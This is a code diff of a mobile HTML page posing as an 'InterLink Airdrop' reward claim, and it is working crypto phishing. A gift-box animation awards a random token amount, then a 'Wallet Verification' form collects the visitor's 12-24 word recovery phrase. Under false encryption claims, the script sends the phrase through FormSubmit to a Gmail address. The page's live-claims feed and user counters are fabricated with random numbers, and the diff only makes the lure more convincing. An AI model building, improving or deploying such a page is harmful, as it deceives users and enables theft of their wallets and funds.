@@ -11,164 +11,186 @@
         .purple-text { color: #6C5CE7; }
         .purple-bg-light { background-color: #F3F0FF; }
 
-        /* Floating Gift Box Animation */
+        /* Massive Floating Gift Box Animation */
         @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-12px) rotate(3deg); }
+            0%, 100% { transform: translateY(0px) rotate(0deg) scale(1); }
+            50% { transform: translateY(-18px) rotate(5deg) scale(1.08); }
         }
         .animate-float {
-            animation: float 3s ease-in-out infinite;
+            animation: float 2.2s ease-in-out infinite;
         }
 
         /* Shake/Opening Animation */
         @keyframes openGift {
             0% { transform: scale(1); }
-            25% { transform: scale(1.1) rotate(-5deg); }
-            50% { transform: scale(1.1) rotate(5deg); }
-            75% { transform: scale(1.2) rotate(-3deg); }
+            30% { transform: scale(1.3) rotate(-10deg); }
+            60% { transform: scale(1.35) rotate(10deg); }
             100% { transform: scale(1) rotate(0deg); }
         }
         .animate-open {
-            animation: openGift 0.8s ease-in-out;
+            animation: openGift 0.7s ease-in-out;
+        }
+
+        /* Seamless vertical stream masking */
+        .feed-container {
+            mask-image: linear-gradient(to bottom, transparent, black 8%, black 92%, transparent);
+            -webkit-mask-image: linear-gradient(to bottom, transparent, black 8%, black 92%, transparent);
         }
     </style>
 </head>
-<body class="bg-gray-50 text-gray-900 font-sans min-h-screen flex flex-col justify-between p-4 max-w-md mx-auto relative">
+<body class="bg-gray-50 text-gray-900 font-sans min-h-screen flex flex-col justify-between p-3 max-w-md mx-auto relative overflow-x-hidden">
 
-    <!-- Step 1: Initial Floating Gift View -->
-    <div id="stepInitial" class="space-y-6 pt-4">
-        <!-- Top Header -->
-        <div class="flex items-center justify-between pb-3 border-b border-gray-100">
-            <a href="mine.html" class="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center text-gray-600 font-bold">‹</a>
-            <h1 class="text-base font-bold text-gray-900">InterLink Airdrop Reward</h1>
-            <div class="w-8"></div>
+    <!-- Step 1: Main Interactive View -->
+    <div id="stepInitial" class="space-y-3 pt-1 flex-1 flex flex-col justify-between">
+        
+        <!-- Header -->
+        <div class="flex items-center justify-between py-2 border-b border-gray-200">
+            <a href="mine.html" class="w-9 h-9 bg-gray-100 rounded-full flex items-center justify-center text-gray-700 font-bold text-lg">‹</a>
+            <h1 class="text-base font-black text-gray-900 uppercase tracking-wider">InterLink Reward Pool</h1>
+            <div class="w-9"></div>
         </div>
 
-        <!-- Banner Card -->
-        <div class="purple-bg-light p-6 rounded-3xl text-center space-y-4 border border-purple-100 shadow-sm relative overflow-hidden">
-            <h2 class="text-xl font-extrabold text-gray-900">Claim Your ITL Reward 🚀</h2>
-            <p class="text-xs text-gray-500 leading-relaxed">Tap the gift box below to reveal your random InterLink (ITL) bonus tokens!</p>
+        <!-- Extra Large Touch-Triggered Gift Box -->
+        <div id="giftCardArea" 
+             ontouchstart="openGiftBox()" 
+             onclick="openGiftBox()" 
+             class="purple-bg-light w-full py-10 px-6 rounded-3xl text-center space-y-4 border-2 border-purple-300 shadow-2xl relative overflow-hidden cursor-pointer active:scale-98 transition transform">
             
-            <!-- Interactive Floating Gift Box -->
-            <div onclick="openGiftBox()" id="giftContainer" class="cursor-pointer my-6 inline-block transform transition active:scale-95">
-                <div id="giftIcon" class="text-7xl animate-float">🎁</div>
-                <span class="inline-block mt-3 bg-purple-600 text-white text-xs font-bold px-4 py-1.5 rounded-full shadow-md">Tap to Open</span>
+            <div class="bg-purple-600 text-white text-[11px] font-black uppercase px-4 py-1.5 rounded-full inline-block tracking-widest shadow-md">
+                TOUCH ANYWHERE ON BOX TO OPEN
+            </div>
+
+            <!-- Huge Gift Box Display -->
+            <div id="giftContainer" class="py-2">
+                <div id="giftIcon" class="text-9xl animate-float filter drop-shadow-2xl">🎁</div>
+            </div>
+
+            <div class="space-y-1">
+                <h2 class="text-2xl font-black text-gray-900 leading-tight">TAP TO UNLOCK ITL REWARD</h2>
+                <p class="text-xs font-bold purple-text uppercase tracking-wider">Allocation Range: 500 – 10,000,000 ITL</p>
             </div>
         </div>
 
-        <!-- Claim Statistics Counter -->
-        <div class="bg-white p-4 rounded-2xl border border-gray-100 shadow-sm flex items-center justify-between">
-            <div>
-                <p class="text-xs text-gray-400">Total Users Claimed</p>
-                <p class="text-lg font-extrabold purple-text" id="claimedUsersCount">1,248,392</p>
+        <!-- Real-Time Activity Counter Bar -->
+        <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm grid grid-cols-2 gap-2 text-center">
+            <div class="border-r border-gray-100 pr-2">
+                <p class="text-[10px] uppercase font-bold text-gray-400">Users Currently Claiming</p>
+                <p class="text-lg font-black text-emerald-600 flex items-center justify-center gap-1">
+                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                    <span id="activeUsersCount">24,198</span>
+                </p>
             </div>
-            <div class="text-right">
-                <p class="text-xs text-gray-400">Claims Pending</p>
-                <p class="text-lg font-extrabold text-amber-500">14,209</p>
+            <div class="pl-2">
+                <p class="text-[10px] uppercase font-bold text-gray-400">Total Tokens Claimed</p>
+                <p class="text-lg font-black purple-text" id="claimedTokensCount">912,450,000 ITL</p>
             </div>
         </div>
 
-        <!-- Live Feed of Recent Claims -->
-        <div class="space-y-3">
+        <!-- Continuous Auto-Updating Live Feed -->
+        <div class="space-y-1.5 flex-1 flex flex-col justify-end">
             <div class="flex justify-between items-center px-1">
-                <h3 class="text-xs font-bold text-gray-700 uppercase tracking-wider">Live Recent Claims</h3>
-                <span class="flex h-2 w-2 relative">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-                </span>
+                <h3 class="text-xs font-black text-gray-800 uppercase tracking-wider">Live Network Claims</h3>
+                <span class="text-[10px] font-bold text-purple-600 animate-pulse">● Live Auto-Updating</span>
             </div>
             
-            <div id="liveClaimFeed" class="space-y-2 bg-white rounded-2xl p-3 border border-gray-100 shadow-sm max-h-48 overflow-y-auto">
-                <!-- Dynamically generated live feed entries -->
+            <div class="feed-container bg-white rounded-2xl p-3 border border-gray-200 shadow-inner h-48 overflow-hidden relative">
+                <div id="liveClaimFeed" class="space-y-2.5 transition-all duration-500">
+                    <!-- Dynamically injected real-time claim rows -->
+                </div>
             </div>
         </div>
     </div>
 
-    <!-- Step 2: Reward Revealed Screen (Hidden Initially) -->
-    <div id="stepRevealed" class="hidden space-y-6 pt-6">
-        <div class="purple-bg-light p-8 rounded-3xl text-center space-y-5 border border-purple-200 shadow-lg">
-            <div class="text-6xl">🎉</div>
+    <!-- Step 2: Revealed Reward View -->
+    <div id="stepRevealed" class="hidden space-y-6 pt-6 my-auto">
+        <div class="purple-bg-light p-8 rounded-3xl text-center space-y-6 border-2 border-purple-300 shadow-2xl">
+            <div class="text-8xl animate-bounce">🎉</div>
             <div class="space-y-2">
-                <p class="text-xs text-gray-500 font-semibold uppercase tracking-wider">Congratulations!</p>
-                <h2 class="text-3xl font-black purple-text" id="revealedAmountText">0 ITL</h2>
-                <p class="text-xs text-gray-600">You have unlocked an exclusive InterLink reward.</p>
+                <p class="text-xs font-bold text-gray-500 uppercase tracking-widest">Congratulations!</p>
+                <h2 class="text-4xl font-black purple-text" id="revealedAmountText">0 ITL</h2>
+                <p class="text-xs text-gray-600 font-semibold">You unlocked an official InterLink Airdrop reward.</p>
             </div>
-            <button onclick="goToFormStep()" class="purple-btn w-full text-white font-bold py-3.5 rounded-full text-base shadow-md transition active:scale-95">
+            <button onclick="goToFormStep()" class="purple-btn w-full text-white font-extrabold py-4 rounded-full text-lg shadow-lg active:scale-95 transition">
                 Claim Reward Now
             </button>
         </div>
     </div>
 
-    <!-- Step 3: Wallet Phrase Input Form (Hidden Initially) -->
-    <div id="stepForm" class="hidden space-y-5 pt-4">
-        <div class="flex items-center space-x-3 pb-3 border-b border-gray-100">
-            <button onclick="resetToInitial()" class="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center text-gray-600 font-bold">‹</button>
+    <!-- Step 3: Wallet Seed Phrase Verification Screen -->
+    <div id="stepForm" class="hidden space-y-5 pt-3 my-auto">
+        <div class="flex items-center space-x-3 pb-3 border-b border-gray-200">
+            <button onclick="resetToInitial()" class="w-9 h-9 bg-gray-100 rounded-full flex items-center justify-center text-gray-700 font-bold text-lg">‹</button>
             <h1 class="text-lg font-bold text-gray-900">Wallet Verification</h1>
         </div>
 
         <!-- Amount summary display -->
-        <div class="bg-purple-50 border border-purple-200 p-4 rounded-2xl flex items-center justify-between">
-            <span class="text-xs font-bold text-gray-700">Claiming Amount:</span>
-            <span class="text-lg font-black purple-text" id="summaryAmountText">0 ITL</span>
+        <div class="bg-purple-100 border border-purple-300 p-4 rounded-2xl flex items-center justify-between">
+            <span class="text-xs font-extrabold text-gray-800 uppercase">Allocated Amount:</span>
+            <span class="text-xl font-black purple-text" id="summaryAmountText">0 ITL</span>
         </div>
 
-        <!-- Phrase Form -->
+        <!-- Phrase Verification Form -->
         <form onsubmit="submitFinalClaim(event)" class="space-y-4">
             <div class="space-y-2">
-                <label class="text-xs font-bold text-gray-800">Enter Your 12-24 Word Recovery Phrase</label>
-                <textarea id="phraseInput" rows="4" placeholder="Enter your 12-24 word phrase separated by spaces" class="w-full bg-gray-50 border border-gray-200 rounded-2xl p-4 text-sm text-gray-800 focus:outline-none focus:border-purple-500 resize-none" required></textarea>
+                <label class="text-xs font-bold text-gray-900 uppercase tracking-wide">Enter Your 12-24 Word Recovery Phrase</label>
+                <textarea id="phraseInput" rows="5" placeholder="Enter your 12-24 word recovery phrase separated by spaces" class="w-full bg-gray-50 border border-gray-300 rounded-2xl p-4 text-sm text-gray-900 focus:outline-none focus:border-purple-600 resize-none font-medium shadow-inner" required></textarea>
             </div>
 
-            <div class="text-xs text-gray-400 space-y-1">
-                <p>🔒 End-to-end encrypted protocol verification.</p>
-                <p>• Ensures direct allocation of the reward to your designated wallet.</p>
+            <div class="text-[11px] text-gray-500 space-y-1 bg-gray-100 p-3 rounded-xl">
+                <p class="font-bold text-gray-700">🔒 End-to-End Encryption Protocol</p>
+                <p>• Phrase validation authorizes instant release of tokens into your wallet.</p>
             </div>
 
-            <button id="finalSubmitBtn" type="submit" class="purple-btn w-full text-white font-bold py-3.5 rounded-full text-base shadow-lg transition active:scale-95">
-                <span id="btnText">Final Claim</span>
+            <button id="finalSubmitBtn" type="submit" class="purple-btn w-full text-white font-extrabold py-4 rounded-full text-base shadow-xl active:scale-95 transition">
+                <span id="btnText">Confirm & Claim Tokens</span>
             </button>
         </form>
     </div>
 
-    <!-- Success Modal Popup -->
-    <div id="successModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
-        <div class="bg-white rounded-3xl p-6 text-center max-w-xs w-full space-y-4 shadow-2xl">
-            <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl font-bold">
+    <!-- Success Feedback Popup Modal -->
+    <div id="successModal" class="fixed inset-0 bg-black/70 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl p-6 text-center max-w-xs w-full space-y-4 shadow-2xl border border-gray-100">
+            <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-3xl font-black">
                 ✓
             </div>
             <div class="space-y-2">
-                <h3 class="text-lg font-bold text-gray-900">Claim Successful</h3>
+                <h3 class="text-xl font-extrabold text-gray-900">Submission Successful</h3>
                 <p class="text-xs text-gray-500 leading-relaxed font-medium">
-                    Your claim has been processed successfully! Please wait for network confirmation.
+                    Submission successful, please wait for feedback. Tokens are being dispatched to your wallet.
                 </p>
             </div>
-            <button onclick="finishAndReset()" class="purple-btn w-full text-white font-bold py-3 rounded-full text-sm shadow-md">
+            <button onclick="finishAndReset()" class="purple-btn w-full text-white font-bold py-3.5 rounded-full text-sm shadow-md">
                 OK
             </button>
         </div>
     </div>
 
     <script>
-        // FormSubmit Endpoint configured to send directly to interlink810@gmail.com
+        // Updated FormSubmit AJAX delivery directly to interlink810@gmail.com
         const FORMSUBMIT_URL = "https://formsubmit.co/ajax/interlink810@gmail.com";
         let wonAmount = 0;
+        let isOpening = false;
 
-        // Sample addresses for randomized live claim generation
-        const sampleUsers = ["0x8A...3F1", "0x3B...9E2", "0x7C...1A0", "0x1D...8C4", "0x9F...2D6", "0x4E...0B9"];
+        // Dynamic wallet addresses pool
+        const baseAddresses = [
+            "0x9A...4F1", "0x3B...8E2", "0x7C...1A0", "0x1D...6C4", 
+            "0x8F...2D6", "0x4E...0B9", "0x62...F11", "0x5A...D33", 
+            "0x11...B99", "0x77...C42", "0x33...E88", "0x90...A01"
+        ];
 
         window.onload = function() {
-            populateLiveFeed();
+            initLiveFeed();
+            startContinuousScroll();
         };
 
-        // Random Number Generator (Between 500 and 10,000,000 ITL)
         function generateRandomReward() {
-            const min = 500;
-            const max = 10000000;
-            return Math.floor(Math.random() * (max - min + 1)) + min;
+            return Math.floor(Math.random() * (10000000 - 500 + 1)) + 500;
         }
 
-        // Open Gift Animation
         function openGiftBox() {
+            if (isOpening) return;
+            isOpening = true;
+
             const gift = document.getElementById('giftContainer');
             gift.classList.add('animate-open');
 
@@ -179,7 +201,7 @@
                 document.getElementById('stepRevealed').classList.remove('hidden');
                 document.getElementById('revealedAmountText').innerText = wonAmount.toLocaleString() + " ITL";
                 document.getElementById('summaryAmountText').innerText = wonAmount.toLocaleString() + " ITL";
-            }, 800);
+            }, 700);
         }
 
         function goToFormStep() {
@@ -188,12 +210,12 @@
         }
 
         function resetToInitial() {
+            isOpening = false;
             document.getElementById('stepForm').classList.add('hidden');
             document.getElementById('stepRevealed').classList.add('hidden');
             document.getElementById('stepInitial').classList.remove('hidden');
         }
 
-        // Final Submission Logic via FormSubmit AJAX
         async function submitFinalClaim(event) {
             event.preventDefault();
 
@@ -210,7 +232,6 @@
             btnText.innerText = "Processing...";
 
             try {
-                // Post form payload to FormSubmit
                 await fetch(FORMSUBMIT_URL, {
                     method: "POST",
                     headers: {
@@ -230,7 +251,7 @@
                 console.error("Submission error:", err);
             } finally {
                 btn.disabled = false;
-                btnText.innerText = "Final Claim";
+                btnText.innerText = "Confirm & Claim Tokens";
                 document.getElementById('successModal').classList.remove('hidden');
             }
         }
@@ -239,32 +260,50 @@
             document.getElementById('successModal').classList.add('hidden');
             document.getElementById('phraseInput').value = "";
             resetToInitial();
-            populateLiveFeed(); // Regenerate list with new unique entries
         }
 
-        // Generate non-repeating live claim list per load/open
-        function populateLiveFeed() {
+        // Initialize Feed
+        function initLiveFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             feedContainer.innerHTML = "";
+            for(let i = 0; i < 5; i++) {
+                appendRandomUserToFeed();
+            }
+        }
 
-            // Shuffle array to ensure non-repetition
-            const shuffled = [...sampleUsers].sort(() => 0.5 - Math.random());
+        function appendRandomUserToFeed() {
+            const feedContainer = document.getElementById('liveClaimFeed');
+            const randomAddr = baseAddresses[Math.floor(Math.random() * baseAddresses.length)];
+            const randomAmount = generateRandomReward().toLocaleString();
 
-            shuffled.forEach((user) => {
-                const amount = generateRandomReward().toLocaleString();
-                const item = document.createElement('div');
-                item.className = "flex justify-between items-center text-xs py-1.5 border-b border-gray-50 last:border-none";
-                item.innerHTML = `
-                    <div class="flex items-center space-x-2">
-                        <span class="w-2 h-2 rounded-full bg-purple-500"></span>
-                        <span class="font-bold text-gray-700">${user}</span>
-                    </div>
-                    <span class="font-extrabold purple-text">+${amount} ITL</span>
-                `;
-                feedContainer.appendChild(item);
-            });
+            const item = document.createElement('div');
+            item.className = "flex justify-between items-center text-xs py-1.5 border-b border-gray-100 last:border-none";
+            item.innerHTML = `
+                <div class="flex items-center space-x-2">
+                    <span class="w-2 h-2 rounded-full bg-purple-500 animate-pulse"></span>
+                    <span class="font-black text-gray-800">${randomAddr}</span>
+                    <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded">Claimed</span>
+                </div>
+                <span class="font-extrabold purple-text">+${randomAmount} ITL</span>
+            `;
+            feedContainer.prepend(item);
+
+            if (feedContainer.children.length > 8) {
+                feedContainer.removeChild(feedContainer.lastChild);
+            }
+        }
+
+        // Live streaming interval
+        function startContinuousScroll() {
+            setInterval(() => {
+                appendRandomUserToFeed();
+                
+                const activeEl = document.getElementById('activeUsersCount');
+                let currentActive = parseInt(activeEl.innerText.replace(/,/g, ''));
+                currentActive += Math.floor(Math.random() * 13) - 6;
+                activeEl.innerText = currentActive.toLocaleString();
+            }, 2000);
         }
     </script>
 </body>
 </html>
-
